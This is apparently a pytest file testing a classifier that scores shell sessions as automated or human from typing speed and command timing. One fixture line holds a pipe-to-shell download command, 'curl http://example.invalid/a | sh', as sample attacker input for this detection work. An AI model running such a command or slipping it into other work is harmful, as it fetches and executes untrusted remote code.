from app.classifier import classify


def test_fast_bursty_commands_look_automated():
    commands = [
        {
            "command": "curl http://example.invalid/a | sh" if i == 0 else f"id && echo {i}",
            "typed_ms": 60,
            "gap_ms": None if i == 0 else 120,
            "since_start_ms": 300 + i * 200,
        }
        for i in range(9)
    ]
    result = classify(commands)
    assert result.label == "likely_automated"
    assert result.score >= 70


def test_slow_typed_commands_look_human():
    commands = [
        {"command": "whoami", "typed_ms": 1400, "gap_ms": None, "since_start_ms": 9000},
        {"command": "ls -la", "typed_ms": 1200, "gap_ms": 9000, "since_start_ms": 19200},
        {"command": "cat notes.txt", "typed_ms": 2300, "gap_ms": 11000, "since_start_ms": 32500},
    ]
    result = classify(commands)
    assert result.label == "likely_human"
    assert result.score <= 30


def test_no_commands_is_unknown():
    assert classify([]).label == "unknown"
